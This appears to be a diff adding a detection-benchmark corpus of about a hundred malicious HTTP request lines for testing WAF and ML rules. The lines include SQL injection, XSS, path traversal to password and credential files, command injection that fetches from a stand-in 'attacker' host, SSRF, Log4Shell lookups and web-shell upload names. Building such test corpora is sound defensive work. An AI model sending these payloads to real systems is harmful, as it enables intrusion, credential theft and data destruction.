@@ -1,0 +1,111 @@
+# Malicious HTTP probe corpus — METHOD PATH?QUERY per line.
+# WHY: covers the OWASP Top 10 attack families plus tooling fingerprints.
+#      Every line should trigger ≥ 1 OWASP CRS rule OR raise ML prob > 0.7.
+# NOTE: keep payloads URL-safe; the bench harness sends them verbatim.
+
+# ── SQL injection — classic boolean / UNION ─────────────────────────────
+GET /index.php?id=1%20OR%201=1--
+GET /index.php?id=1'%20OR%20'1'='1
+GET /index.php?id=1'%20OR%201=1--
+GET /index.php?id=1)%20UNION%20SELECT%20null,null,null--
+GET /index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--
+GET /index.php?id=1%20UNION%20ALL%20SELECT%20null,version(),null--
+GET /index.php?id=1%20AND%20SLEEP(5)--
+GET /search?q=admin'--
+GET /search?q=admin'+OR+'a'='a
+GET /search?q=1';DROP%20TABLE%20users--
+GET /api/v1/users?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user
+GET /index.php?id=1;%20WAITFOR%20DELAY%20'0:0:5'--
+GET /search?q=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))zzz)
+GET /index.php?id=1%20OR%20updatexml(1,concat(0x7e,(SELECT%20user())),0)--
+POST /login.php
+
+# ── XSS ─────────────────────────────────────────────────────────────────
+GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E
+GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E
+GET /search?q=%3Csvg/onload=alert(1)%3E
+GET /search?q=javascript:alert(1)
+GET /search?q=%3Ciframe%20src=javascript:alert(1)%3E
+GET /search?q=%3Cbody%20onload=alert(1)%3E
+GET /search?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+GET /search?q=%3Cscript%3Edocument.cookie%3C/script%3E
+GET /comment?text=%3Cscript%3Eeval(atob('YWxlcnQoMSk='))%3C/script%3E
+GET /profile?name=%3Cinput%20onfocus=alert(1)%20autofocus%3E
+
+# ── Path traversal / LFI ────────────────────────────────────────────────
+GET /files?name=../../../../etc/passwd
+GET /files?name=../../../../etc/shadow
+GET /files?name=..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /files?name=..%252f..%252f..%252fetc%252fpasswd
+GET /download?file=/etc/passwd
+GET /download?file=/proc/self/environ
+GET /image?path=../../../windows/win.ini
+GET /assets?path=../../../../../../../../etc/hosts
+
+# ── RCE / command injection ─────────────────────────────────────────────
+GET /ping?host=127.0.0.1;cat%20/etc/passwd
+GET /ping?host=127.0.0.1%7Ccat%20/etc/passwd
+GET /ping?host=127.0.0.1%26%26id
+GET /api/v1/util?cmd=id
+GET /api/v1/util?cmd=`id`
+GET /api/v1/util?cmd=$(id)
+GET /api/v1/util?host=$(curl%20http://attacker/x)
+GET /search?q=%7Cwget%20http://attacker/sh
+
+# ── SSRF ────────────────────────────────────────────────────────────────
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+GET /fetch?url=http://localhost:8500/v1/agent/self
+GET /fetch?url=file:///etc/passwd
+GET /fetch?url=gopher://127.0.0.1:6379/_INFO
+
+# ── XXE (in body, but the line carries the marker) ──────────────────────
+POST /api/v1/import
+POST /api/v1/parse
+
+# ── Tooling fingerprints (UA + path together) ───────────────────────────
+GET /index.php?id=1
+GET /admin/sqlmap-test
+GET /xmlrpc.php
+GET /wp-login.php
+GET /wp-admin/admin-ajax.php?action=revslider_show_image
+GET /.git/config
+GET /.env
+GET /.aws/credentials
+GET /phpmyadmin/
+GET /phpinfo.php
+GET /server-status
+
+# ── Log4Shell-style ─────────────────────────────────────────────────────
+GET /api/v1/lookup?key=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%2Fa%7D
+GET /api/v1/lookup?key=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3Aldap%3A%2F%2Fattacker%2Fa%7D
+
+# ── HTTP smuggling-flavored junk ────────────────────────────────────────
+GET /
+GET /api/v1/orders?id=1%00admin
+GET /api/v1/users?id=%FF
+GET /index.php?id=1%2527%2520OR%25201%253D1--
+
+# ── Open redirect ───────────────────────────────────────────────────────
+GET /redirect?url=https://evil.tld
+GET /goto?to=//evil.tld/
+GET /redirect?url=%2F%2Fevil.tld
+
+# ── Auth-bypass-y ───────────────────────────────────────────────────────
+GET /admin?token=null
+GET /admin?token=undefined
+GET /admin?role=admin
+GET /api/v1/users/1?role=admin
+PUT /api/v1/users/1
+DELETE /api/v1/users/1
+
+# ── Padding to ~100 entries ─────────────────────────────────────────────
+GET /search?q=%27%20OR%201%3D1%23
+GET /search?q=%22%20OR%20%22a%22%3D%22a
+GET /search?q=admin%20--%20
+GET /index.php?id=1%2F*comment*%2FUNION%2F*comment*%2FSELECT%201,2,3
+GET /index.php?id=concat(0x7e,(select%20user()),0x7e)
+GET /index.php?id=1%20and%20benchmark(5000000,sha1(1))
+GET /index.php?id=if(1=1,sleep(3),0)
+GET /api/v1/upload?filename=../../shell.php
+GET /api/v1/upload?filename=shell.php%00.jpg
+GET /search?q=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E
